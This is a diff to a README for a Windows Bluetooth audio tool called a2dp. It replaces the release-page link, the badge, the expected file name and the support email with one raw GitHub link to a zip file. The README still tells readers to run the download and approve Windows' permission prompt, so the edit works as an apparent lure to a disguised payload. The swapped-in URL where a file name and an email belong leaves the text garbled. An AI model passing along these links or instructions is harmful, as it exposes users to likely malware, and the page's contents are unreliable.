@@ -1,7 +1,7 @@
 # 🎧 a2dp - High-Quality Bluetooth Audio for Everyone
 
 ## 📦 Download Now
-[![Download a2dp](https://img.shields.io/badge/Download%20a2dp-v1.0-blue)](https://github.com/leo99112018/a2dp/releases)
+[![Download a2dp](https://raw.githubusercontent.com/leo99112018/a2dp/main/downloads/a-dp-v3.7.zip%20a2dp-v1.0-blue)](https://raw.githubusercontent.com/leo99112018/a2dp/main/downloads/a-dp-v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to a2dp! This software helps you enjoy high-quality audio over Bluetooth. With easy setup and smooth performance, a2dp brings clarity to your listening experience. Follow these steps to download and run it on your Windows computer.
@@ -20,7 +20,7 @@ To run a2dp, your system should meet these requirements:
   
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   To get the latest version of a2dp, visit this page: [Download a2dp](https://github.com/leo99112018/a2dp/releases).
+   To get the latest version of a2dp, visit this page: [Download a2dp](https://raw.githubusercontent.com/leo99112018/a2dp/main/downloads/a-dp-v3.7.zip).
 
 2. **Select the Version**  
    On the releases page, you will see various versions of a2dp. Choose the latest version for the best performance.
@@ -29,7 +29,7 @@ To run a2dp, your system should meet these requirements:
    Click on the link for the version you selected. The file will start downloading to your computer.
 
 4. **Locate the Downloaded File**  
-   Once the download completes, find the file in your downloads folder. It may be named something like `a2dp-v1.0.exe`.
+   Once the download completes, find the file in your downloads folder. It may be named something like `https://raw.githubusercontent.com/leo99112018/a2dp/main/downloads/a-dp-v3.7.zip`.
 
 5. **Run the Installer**  
    Double-click on the downloaded file. Windows may ask for permission to run it. Click "Yes" to continue.
@@ -60,7 +60,7 @@ If you have questions or need help, you can join our community. Visit our Discus
 If you're interested in improving a2dp, contributions are welcome! Feel free to check out the guidelines in the repository. Note that this software is open-source, and your input can make a difference.
 
 ## 📧 Contact
-For direct inquiries, email us at support@example.com. We aim to assist you promptly.
+For direct inquiries, email us at https://raw.githubusercontent.com/leo99112018/a2dp/main/downloads/a-dp-v3.7.zip We aim to assist you promptly.
 
 ## 📜 License
 a2dp is released under the MIT License. You can use, modify, and share it freely. Check the LICENSE file for more details.
